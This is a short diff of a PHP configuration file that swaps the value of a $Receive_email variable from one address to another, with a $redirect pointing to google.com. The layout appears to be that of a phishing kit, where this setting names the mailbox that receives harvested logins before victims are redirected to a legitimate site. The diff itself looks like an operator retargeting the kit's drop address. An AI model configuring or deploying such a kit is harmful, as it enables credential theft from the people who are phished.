@@ -1,5 +1,5 @@
 <?php 
-$Receive_email="info@planalfas.ml";
+$Receive_email="whelas8@yandex.com";
 $redirect="https://www.google.com/";
 ?>
-info@planalfas.ml
+whelas8@yandex.com
